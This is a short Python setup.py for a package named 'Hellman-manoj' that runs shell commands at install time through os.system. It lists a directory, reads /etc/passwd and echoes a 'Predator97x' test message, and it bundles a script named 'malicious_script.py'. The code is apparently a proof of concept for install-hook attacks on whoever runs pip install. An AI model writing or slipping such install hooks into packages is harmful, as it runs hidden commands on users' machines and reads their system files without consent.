from setuptools import setup
import os

# This will be executed during pip install
os.system('echo "Testing Predator97x Code"')
os.system('ls -la')
os.system('cat /etc/passwd')  # Just an example, be careful with real attacks

setup(
    name='Hellman-manoj',
    version='0.1',
    scripts=['malicious_script.py'],
)
